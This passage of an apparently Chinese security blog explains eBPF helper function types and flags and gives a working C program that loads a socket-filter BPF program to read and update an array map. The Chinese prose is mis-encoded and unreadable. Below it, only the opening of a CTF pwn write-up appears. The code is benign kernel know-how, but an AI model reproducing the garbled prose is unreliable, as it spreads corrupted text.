è¿”å›ä¸€ä¸ªæŒ‡å‘åˆæ³•åœ°å€çš„æŒ‡é’ˆæˆ–ä¸€ä¸ªbtf_id */</span></span><br><span class="line">  RET_PTR_TO_BTF_ID,  <span class="comment">/* è¿”å›ä¸€ä¸ªæŒ‡å‘btf_idçš„æŒ‡é’ˆ */</span></span><br><span class="line">  __BPF_RET_TYPE_MAX,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ‰©å±•éƒ¨åˆ†å¢åŠ äº†ä¸å°‘<code>RET_PTR_TO_XXX_OR_NULL</code>ç±»å‹ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨åŸç±»å‹çš„åŸºç¡€ä¸Šå¢åŠ äº†æ ‡å¿—<code>PTR_MAYBE_NULL</code><br>è¿™ç§ç±»å‹åœ¨æ£€éªŒçš„æ—¶å€™ä¼šå…¼é¡¾ä¸¤ç§æƒ…å†µï¼Œåœ¨ç¼–å†™æ—¶è¦å¢åŠ æ£€éªŒ0çš„æ“ä½œ(if R0 &#x3D;&#x3D; 0 then exit)</p>
</blockquote>
<ul>
<li>é™„åŠ å‚æ•°æ ‡å¿—<code>bpf_type_flag</code></li>
</ul>
<figure class="highlight c"><figcaption><span>éƒ¨åˆ†</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/bpf.h#L629">å®Œæ•´ç‰ˆ</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_type_flag</span> &#123;</span></span><br><span class="line">  <span class="comment">/* PTR å¯èƒ½ä¸º NULL. */</span></span><br><span class="line">  PTR_MAYBE_NULL  = BIT(<span class="number">0</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM æ˜¯åªè¯»çš„ã€‚å½“åœ¨bpf_argä¸Šåº”ç”¨æ—¶ï¼Œè¡¨æ˜è¯¥å‚æ•°æ—¢å¯ä»¥æ˜¯</span></span><br><span class="line"><span class="comment">    * å¯å˜å†…å­˜ä¹Ÿå¯ä»¥æ˜¯ä¸å¯å˜å†…å­˜.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  MEM_RDONLY  = BIT(<span class="number">1</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM æŒ‡å‘ BPF ä¿ç•™çš„ç¯å½¢ç¼“å†²åŒº(ring buffer reservation). */</span></span><br><span class="line">  MEM_RINGBUF  = BIT(<span class="number">2</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM åœ¨ç”¨æˆ·ç©ºé—´å†…. */</span></span><br><span class="line">  MEM_USER  = BIT(<span class="number">3</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM å¯ä»¥æœªåˆå§‹åŒ–. */</span></span><br><span class="line">  MEM_UNINIT  = BIT(<span class="number">7</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* å¤§å°åœ¨ç¼–è¯‘æœŸå°±æ˜ç¡®. */</span></span><br><span class="line">  MEM_FIXED_SIZE  = BIT(<span class="number">10</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* å†…å­˜å¿…é¡»åœ¨æŸäº›æ¶æ„ä¸Šå¯¹é½ï¼Œ</span></span><br><span class="line"><span class="comment">    * ä¸MEM_FIXED_SIZEä¸€èµ·ä½¿ç”¨.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  MEM_ALIGNED  = BIT(<span class="number">17</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM å°†è¦è¢«å†™å…¥, ç»å¸¸å’Œ MEM_UNINIT ä¸€èµ·ä½¿ç”¨. Non-presence</span></span><br><span class="line"><span class="comment">    * ä¸å‡ºç° MEM_WRITE æ„å‘³ç€ MEM ä»…ä»…è¢«è¯»å–. MEM_WRITE åœ¨ä¸ä¸</span></span><br><span class="line"><span class="comment">    * MEM_UNINIT æ­é…æ—¶æ„å‘³ç€è¯¥å†…å­˜éœ€è¦åˆå§‹åŒ–ï¼Œå› ä¸ºå®ƒä¹Ÿä¼šè¢«è¯»å–.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  MEM_WRITE  = BIT(<span class="number">18</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  __BPF_TYPE_FLAG_MAX,</span><br><span class="line">  __BPF_TYPE_LAST_FLAG = __BPF_TYPE_FLAG_MAX - <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å‚æ•°å¯ä»¥ä»¥æŒ‰ä½æˆ–çš„æ–¹å¼ä¸<code>ARG_PTR_TO_xxx</code>ç»„åˆ</p>
<p>åœ¨å¯„å­˜å™¨ç« èŠ‚æœ‰è®²åˆ°ï¼Œ<code>BPF_REG_1</code> ~ <code>BPF_REG_5</code>ä¾æ¬¡ä¸ºHelperå‡½æ•°å‚æ•°ä¼ é€’å¯„å­˜å™¨ï¼Œ<code>BPF_REG_0</code>å­˜æ”¾Helperå‡½æ•°è¿”å›å€¼ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ ¹æ®å‚æ•°ç¼–å†™æ­£ç¡®çš„Helperè°ƒç”¨ã€‚</p>
<h3 id="Helperå‡½æ•°ä»‹ç»"><a href="#Helperå‡½æ•°ä»‹ç»" class="headerlink" title="Helperå‡½æ•°ä»‹ç»"></a>Helperå‡½æ•°ä»‹ç»</h3><p>mapç›¸å…³Helperå‡½æ•°</p>
<ul>
<li><code>bpf_map_lookup_elem</code></li>
</ul>
<figure class="highlight c"><figcaption><span>åŸå‹</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/bpf/helpers.c#L45">å‡ºå¤„</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_lookup_elem_proto</span> =</span> &#123;</span><br><span class="line">  .func  = bpf_map_lookup_elem,</span><br><span class="line">  .gpl_only = <span class="literal">false</span>,</span><br><span class="line">  .pkt_access = <span class="literal">true</span>,</span><br><span class="line">  .ret_type = RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="line">  .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="line">  .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(* <span class="type">const</span> bpf_map_lookup_elem)(<span class="type">void</span> *<span class="built_in">map</span>, <span class="type">const</span> <span class="type">void</span> *key) = (<span class="type">void</span> *) <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>arg1 ç±»å‹è§ä¸Šæ–‡<br>arg2 ç±»å‹ä¸º<code>ARG_PTR_TO_MAP_KEY</code>ï¼Œäº‹å®ä¸Šç”¨ä¸€ä¸ªæŒ‡å‘æ ˆçš„æŒ‡é’ˆå³å¯</p>
</blockquote>
<p>åœ¨mapä¸­æ ¹æ®keyæ¥æŸ¥æ‰¾value</p>
<p>è¿”å›å€¼ä¸ºä¸€ä¸ªæŒ‡å‘map valueçš„æŒ‡é’ˆæˆ–NULLï¼ˆ0ï¼‰ï¼Œéœ€è¦åˆ¤æ–­ç©ºæŒ‡é’ˆæ“ä½œ</p>
<ul>
<li><code>bpf_map_update_elem</code></li>
</ul>
<figure class="highlight c"><figcaption><span>åŸå‹</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/bpf/helpers.c#L62">å‡ºå¤„</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_update_elem_proto</span> =</span> &#123;</span><br><span class="line">  .func  = bpf_map_update_elem,</span><br><span class="line">  .gpl_only = <span class="literal">false</span>,</span><br><span class="line">  .pkt_access = <span class="literal">true</span>,</span><br><span class="line">  .ret_type = RET_INTEGER,</span><br><span class="line">  .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="line">  .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="line">  .arg3_type = ARG_PTR_TO_MAP_VALUE,</span><br><span class="line">  .arg4_type = ARG_ANYTHING,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">long</span> <span class="params">(* <span class="type">const</span> bpf_map_update_elem)</span><span class="params">(<span class="type">void</span> *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">                                          <span class="type">const</span> <span class="type">void</span> *key,</span></span><br><span class="line"><span class="params">                                          <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                                          __u64 flags)</span> = (<span class="type">void</span> *) <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_update_elem)</span><br></pre></td></tr></table></figure>

<p>æ›´æ–°&#x2F;æ’å…¥key-valueå¯¹ï¼Œflagå‚æ•°ä¸º<code>BPF_NOEXIST</code>ï¼ˆkeyä¸å­˜åœ¨æ—¶æ‰ä¼šæ›´æ–°ï¼‰ï¼Œ<code>BPF_EXIST</code>ï¼ˆä»…åœ¨keyå­˜åœ¨æ—¶æ›´æ–°ï¼‰æˆ–<code>BPF_ANY</code>ï¼ˆä¸¤ç§æƒ…å†µå‡å¯ï¼‰</p>
<blockquote>
<p>å’Œç”¨æˆ·æ€è°ƒç”¨å‚æ•°ä¸€è‡´</p>
<blockquote>
<p>arg2, arg3ç±»å‹å‡å¯ä»¥ç”¨æŒ‡å‘æ ˆçš„æŒ‡é’ˆ</p>
</blockquote>
</blockquote>
<p>å¦‚æœæˆåŠŸè¿”å›0,å¤±è´¥åˆ™è¿”å›ä¸€ä¸ªè´Ÿçš„é”™è¯¯å·</p>
<h3 id="å®Œæ•´ç¤ºä¾‹ç¨‹åº"><a href="#å®Œæ•´ç¤ºä¾‹ç¨‹åº" class="headerlink" title="å®Œæ•´ç¤ºä¾‹ç¨‹åº"></a>å®Œæ•´ç¤ºä¾‹ç¨‹åº</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./bpf_insn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ptr_to_u64(val) (uint64_t)val</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bpf(cmd, attr, size) syscall(__NR_bpf, cmd, attr, size)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> map_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> value_size, <span class="type">unsigned</span> <span class="type">int</span> max_entries,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> map_flags)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_type = map_type,</span><br><span class="line">      .key_size = key_size,</span><br><span class="line">      .value_size = value_size,</span><br><span class="line">      .max_entries = max_entries,</span><br><span class="line">      .map_flags = map_flags,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_lookup_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *value)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_fd = fd,</span><br><span class="line">      .key = ptr_to_u64(key),</span><br><span class="line">      .value = ptr_to_u64(value),</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_update_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                           <span class="type">uint64_t</span> flags)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_fd = fd,</span><br><span class="line">      .key = ptr_to_u64(key),</span><br><span class="line">      .value = ptr_to_u64(value),</span><br><span class="line">      .flags = flags,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_BUF_SIZE 0x800</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog_load_once</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">      BPF_LD_MAP_FD(BPF_REG_1, map_fd),</span><br><span class="line"></span><br><span class="line">      BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x8</span>, <span class="number">0x0</span>),</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-0x8</span>),</span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>), BPF_EXIT_INSN(),</span><br><span class="line">      BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, <span class="number">0</span>), BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, <span class="number">0x10</span>), BPF_LD_MAP_FD(BPF_REG_1, map_fd),</span><br><span class="line"></span><br><span class="line">      BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x8</span>, <span class="number">0x1</span>),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-0x8</span>),</span><br><span class="line"></span><br><span class="line">      BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, <span class="number">-0x10</span>),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-0x10</span>),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),</span><br><span class="line"></span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_update_elem),</span><br><span class="line">      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>), BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_0, <span class="number">0x0</span>), BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">      .insns = ptr_to_u64(&amp;insns),</span><br><span class="line">      .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bpf_insn),</span><br><span class="line">      .license = ptr_to_u64(<span class="string">&quot;GPL&quot;</span>),</span><br><span class="line">      .log_buf = ptr_to_u64(bpf_log_buf),</span><br><span class="line">      .log_size = LOG_BUF_SIZE,</span><br><span class="line">      .log_level = <span class="number">2</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">trigger1</span><span class="params">(<span class="type">int</span> prog_fd, <span class="type">uint64_t</span> *payload)</span> &#123;</span><br><span class="line">  socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets);</span><br><span class="line">  setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd));</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *buffer = (<span class="type">char</span> *)payload;</span><br><span class="line">  <span class="keyword">return</span> write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  map_fd =</span><br><span class="line">      bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="type">int</span>), <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>), <span class="number">0x2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error while creating bpf map&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> value = <span class="number">0xaaaabbbb</span>;</span><br><span class="line">  bpf_update_elem(map_fd, &amp;key, &amp;value, BPF_ANY);</span><br><span class="line">  <span class="comment">// map[0] = 0xaaaabbbb</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> prog_fd = bpf_prog_load_once();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;log: \n%s\n&quot;, bpf_log_buf);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (prog_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error while loading bpf program&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">uint64_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ret = trigger1(prog_fd, payload);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error while trigger bpf program&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>;</span><br><span class="line">  value = <span class="number">0x0</span>;</span><br><span class="line">  bpf_lookup_elem(map_fd, &amp;key, &amp;value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;find map[%d] = %#lx\n&quot;</span>, key, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2$ ./test</span><br><span class="line">find map[1] = 0xaaaabbcb</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/31/2025tamuctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/03/31/2025tamuctf/" class="post-title-link" itemprop="url">[TAMUctf 2025] Pwn write-up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-03-31 23:46:35" itemprop="dateCreated datePublished" datetime="2025-03-31T23:46:35+08:00">2025-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-25 22:30:59" itemprop="dateModified" datetime="2025-04-25T22:30:59+08:00">2025-04-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>AKé¢˜ç›®6&#x2F;8ï¼Œæœ€æœ‰æ„æ€çš„ä¸€é›†ï¼Œä½“éªŒå¾ˆå¥½ï¼ˆå‡ºé¢˜äººå‘æºç sukiï¼‰ï¼Œæœ€åä¸¤ä¸ªé¢˜çœ‹ä¸æ‡‚è¦å¹²ä»€ä¹ˆ<del>æ‘†äº†</del>æ²¡åš</p>
</blockquote>
